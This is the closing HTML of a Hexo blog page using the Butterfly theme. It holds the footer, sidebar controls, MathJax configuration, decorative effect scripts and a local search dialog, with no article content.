class="copyright">&copy;2020 - 2025 By HvAng</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>